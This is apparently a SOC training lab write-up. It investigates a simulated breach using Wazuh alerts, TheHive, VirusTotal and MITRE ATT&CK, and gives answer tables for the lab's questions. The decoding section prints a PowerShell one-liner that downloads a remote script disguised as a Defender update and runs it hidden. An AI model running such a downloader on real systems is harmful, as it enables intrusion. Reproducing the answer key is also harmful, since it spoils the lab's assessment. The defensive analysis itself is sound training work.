# Investigation Notes — Insight Nexus Breach Analysis

Working log of the methodology used to answer each question, built from `wazuh_export.json` (200 Wazuh alert documents; 192 are generic noise, 8 carry custom rule detections).

## Q1 — Credential dumping parent process (Event ID 4688)

**Technique:** Wazuh already tagged the relevant alert with `rule.groups: ["windows", "credential_access"]`. Filter on that instead of manually scanning all 193 EventID-4688 entries.

```bash
jq '.[] | select(._source.rule.groups[]? == "credential_access")' wazuh_export.json
```

**Result:** One match, host `SRV-MANAGE01`, rule *"Possible credential dumping detected"* (level 10).

```json
{
  "subjectUserName": "Administrator",
  "newProcessName": "C:\\Users\\Administrator\\Downloads\\mimikatz.exe",
  "parentProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
  "subjectDomainName": "INSIGHT"
}
```

**Answer:** `C:\Program Files\Mozilla Firefox\firefox.exe`

**Analysis:** mimikatz was spawned as a child process of Firefox rather than a shell/RDP session — indicating the tool was downloaded and executed directly through a browser session on the compromised ManageEngine admin host (`SRV-MANAGE01`), consistent with Crimson Fox's initial foothold there.

## Q2 — Persistence mechanism `imagePath` on DB01 (Event ID 7045)

**Technique:** Filter on Wazuh's `persistence` rule group rather than manually scanning for service/scheduled-task events across all hosts.

```bash
jq '.[] | select(._source.rule.groups[]? == "persistence")' wazuh_export.json
```

**Result:** One match, host `DB01`, rule *"New Windows service installed"* (level 8), Event ID 7045 (Service Control Manager).

```json
{
  "serviceName": "PSEXESVC",
  "imagePath": "C:\\Windows\\PSEXESVC.exe",
  "user": "SYSTEM",
  "message": "A service was installed to start from Windows root path"
}
```

**Answer:** `C:\Windows\PSEXESVC.exe` (submit with literal double backslashes: `C:\\Windows\\PSEXESVC.exe`)

**Analysis:** `PSEXESVC` is the service PsExec (Sysinternals) installs on a target host to execute commands remotely. Its presence on `DB01` — a database server with no legitimate reason to run interactive admin tooling — indicates the attacker used PsExec for lateral movement/remote execution here, consistent with the domain-wide GPO/MSI deployment phase of the intrusion.

## Q3 — Exfiltration destination IP for `diagnostics_data.zip` (Event ID 3)

**Technique:** Filter on Wazuh's `exfiltration` rule group.

```bash
jq '.[] | select(._source.rule.groups[]? == "exfiltration")' wazuh_export.json
```

**Result:** One match, host `SRV-MANAGE01`, rule *"Large outbound HTTPS POST with filename diagnostics_data.zip"* (level 9), Sysmon Event ID 3 (network connection).

```json
{
  "image": "C:\\Users\\svc_deployer\\AppData\\Roaming\\updater.exe",
  "destinationIp": "93.184.216.34",
  "destinationPort": "443",
  "user": "insight\\svc_deployer",
  "details": "HTTP POST /upload diagnostics_data.zip"
}
```

**Answer:** `93.184.216.34`

**Analysis:** This is a distinct IP from the ManageEngine C2 channel mentioned earlier in the incident narrative (`103.112.60.117`) — a reminder to always verify against the actual log evidence rather than assuming details carry over between phases of an incident. This IP ties directly to an earlier "Suspicious DNS request for rare domain" alert, where `cdn.evilcdn.net` resolved to this same `93.184.216.34`. Full kill chain: a PowerShell one-liner downloads and writes `updater.exe` to `svc_deployer`'s AppData\Roaming → that binary beacons to `cdn.evilcdn.net` (93.184.216.34) → it exfiltrates `diagnostics_data.zip` to the same IP over HTTPS/443.

## Q4 — User connecting to `\\fs01\projects` (Event ID 3)

**Technique:** Filter on the `lateral` rule group. Note this returns **two** events (the GPO/MSI deployment on `DEV-021` is also tagged `lateral`) — the relevant one is identified by its `details` field explicitly naming the share.

```bash
jq '.[] | select(._source.rule.groups[]? == "lateral")' wazuh_export.json
```

**Result:** Rule *"Possible suspicious access to Windows admin shares"* (level 8, groups: `smb`, `lateral`), Sysmon Event ID 3.

```json
{
  "image": "C:\\Windows\\System32\\svchost.exe",
  "sourceIp": "172.16.200.50",
  "destinationIp": "172.16.10.20",
  "destinationPort": "445",
  "user": "svc_admin",
  "details": "SMB connect to \\\\fs01\\projects"
}
```

**Answer:** `svc_admin`

**Analysis:** `sourceIp` (172.16.200.50) maps to `SCDC01`, `destinationIp` (172.16.10.20) maps to `FS01`. The `svc_admin` service account — likely intended for legitimate administrative automation — was used to reach the file server's `projects` share over SMB/445. Combined with the earlier PsExec persistence on `DB01`, this shows the attacker pivoting through multiple internal hosts using compromised service accounts rather than a single foothold, consistent with Crimson Fox's "map users and machines" reconnaissance phase before targeting file shares containing client project data.

---

## Summary — All Answers

| # | Question | Answer |
|---|---|---|
| 1 | Parent process of credential dumping tool | `C:\Program Files\Mozilla Firefox\firefox.exe` |
| 2 | Persistence `imagePath` on DB01 | `C:\Windows\PSEXESVC.exe` |
| 3 | Exfil destination IP for `diagnostics_data.zip` | `93.184.216.34` |
| 4 | User connecting to `\\fs01\projects` | `svc_admin` |

---

## Skills Assessment — SOC Triage in TheHive

### Task 1 — Case Creation & Triage

Filtered TheHive's 43 alerts by the `InsightNexus` tag/keyword, narrowing to 2 relevant alerts:
- `INX-ALERT-2025-00077` — "[InsightNexus] Admin Login via ManageEngine Web Console"
- `INX-WAZUH-2025-00080` — "[InsightNexus] Hacker tool Mimikatz was detected"

Created an empty case titled "Insight Nexus Breach Investigation," imported the ManageEngine alert as the initial case-creating alert, then used "Merge alert(s) into case" on the Mimikatz alert to link it into the same case (Case #1).

## Q1 — VT "Files Referring" on 203.0.113.18

**Technique:** The ManageEngine alert's Comments panel contains a `netstat -ano` output captured post-domain-rejoin, showing two external ESTABLISHED connections: `198.51.100.24:443` and `203.0.113.18:4444`. Port 4444 is the classic default Metasploit/reverse-shell listener port, making it the higher-priority IOC to pivot on first.

Looked up `203.0.113.18` in VirusTotal → **Relations** tab → **Files Referring** section.

**Result:** `MangoJava.exe` (Win32 EXE), 43/69 vendor detections, scanned 2026-08-18.

**Answer:** `MangoJava.exe`

**Analysis:** A file actively communicating with this IP corroborates it as live malicious infrastructure rather than a benign address — good independent confirmation for the netstat finding. This enrichment was documented as a comment directly on the alert in TheHive, closing the loop from raw log evidence to OSINT-confirmed finding.

## Q2 — VT Whois city for 198.51.100.24

**Technique:** VirusTotal → **Details** tab → **Whois Lookup** section.

**Result:** `City: Los Angeles` (registrant record for IANA, since this address falls in the `198.51.100.0/24` block — RFC 5737's TEST-NET-2, reserved for documentation use).

**Answer:** `Los Angeles`

**Analysis:** Worth noting for accuracy: this isn't a real threat-actor-owned server's location — it's IANA's own registration address for the reserved documentation block the lab intentionally used for this "external" IP. Good reminder to distinguish a genuine OSINT finding from a lab-construct artifact when writing up real findings.

## Q3 — MITRE technique for C2 tool transfer

**Technique:** Searched attack.mitre.org for "tool transfer." Matched technique description almost verbatim against the question's scenario ("malware downloads files from a C2 server into the victim network").

**Result:** *Ingress Tool Transfer* — "Adversaries may transfer tools or other files from an external system into a compromised environment... through the command and control channel..."

**Answer:** `T1105`

**Analysis:** Distinguished from the similar-sounding T1570 (Lateral Tool Transfer), which covers movement *between* already-compromised internal systems rather than *from* external C2 — the question specifically describes external-to-internal transfer, so T1105 is correct.

## Q4 — MITRE technique for TheHive rule 92153 (VaultCli.dll)

**Technique:** Browsed TheHive's full 43-alert list (increased page size to show all on one page, since keyword search didn't reliably surface this alert) looking for the `rule=92153` tag.

**Result:** Alert titled "Suspicious process loaded VaultCli.dll module. Possible use to dump stored passwords."

**Answer:** `T1555` (Credential Access from Password Stores)

**Analysis:** VaultCli.dll is part of Windows' Credential Manager/DPAPI vault subsystem — a distinct credential-access mechanism from the LSASS-memory-scraping Mimikatz used elsewhere in this incident (T1003.001). Two different credential-access sub-techniques were used across this breach.

## Q5/Q6 — Decoding the obfuscated PowerShell command

**Technique:** `logs-wazuh.json` (31 events, downloaded separately from `wazuh_export.json`) was searched directly for the keyword `EncodedCommand`:

```bash
jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json
```

**Result:** One matching event — Sysmon Event ID 1, Wazuh rule `34012` (level 12): "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)" on host `VICTIM-HOST-01.corp.local`. Full event:

```json
{
  "rule": {
    "level": 12,
    "description": "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)",
    "id": "34012",
    "groups": ["windows", "sysmon", "execution", "obfuscation"]
  },
  "data": {
    "win": {
      "eventdata": {
        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand <base64>",
        "ParentImage": "C:\\Windows\\system32\\services.exe",
        "User": "CORP\\svc-update",
        "Details": "EncodedCommand present; suspicious flags: -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden"
      }
    }
  }
}
```

The Base64 blob was extracted programmatically (to avoid transcription errors on such a long string) and decoded:

```bash
jq -r '.[] | select(tostring | test("EncodedCommand")) | ._source.data.win.eventdata.CommandLine' logs-wazuh.json | grep -oP '(?<=-EncodedCommand )\S+' | base64 -d
```

**Troubleshooting note:** The first decode attempt assumed standard PowerShell behavior (Base64-of-UTF-16LE) and piped through `iconv -f UTF-16LE -t UTF-8`, producing garbled/mojibake output — twice, across two separate lab sessions, ruling out a copy/paste transcription error. Rather than keep guessing, the raw decoded bytes were inspected with `xxd`, which showed plain ASCII with no interleaved `00` bytes (the signature of UTF-16LE) — confirming this payload was Base64-encoded directly from plain text. Decoding with `base64 -d` alone gave clean output:

```
IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```

**Answer (Q5 — suspicious IP):** `198.51.100.24`
**Answer (Q6 — executing user):** `CORP\svc-update`

**Analysis:** This is a two-stage in-memory downloader: `IEX` pulls a remote `.ps1` script via `WebClient.DownloadString`, disguised as an antivirus-signature update (`deploy-definitions.ps1`) to blend in with legitimate admin/AV traffic, then spawns a second hidden PowerShell process to execute the downloaded script from disk (`C:\Windows\Temp\deploy-definitions.ps1`). The IP `198.51.100.24` is the same address enriched via VirusTotal in Question 2 — two independent evidence sources (OSINT lookup and raw log/PowerShell analysis) corroborating the same piece of attacker infrastructure. The executing account, `CORP\svc-update`, is a service account — consistent with the broader pattern across this whole incident of the attacker abusing legitimate service/automation accounts (`svc_deployer`, `svc_admin`, `svc-update`) rather than obviously "hacked" user accounts, which is exactly what makes this kind of activity hard to spot without behavioral/log correlation.

---

## Summary — Skills Assessment Answers

| # | Question | Answer |
|---|---|---|
| 1 | VT Files Referring filename on 203.0.113.18 | `MangoJava.exe` |
| 2 | VT Whois city for 198.51.100.24 | `Los Angeles` |
| 3 | MITRE technique — C2 tool transfer | `T1105` |
| 4 | MITRE technique — rule 92153 (VaultCli.dll) | `T1555` |
| 5 | Suspicious IP in decoded PowerShell | `198.51.100.24` |
| 6 | User who executed PowerShell command | `CORP\svc-update` |
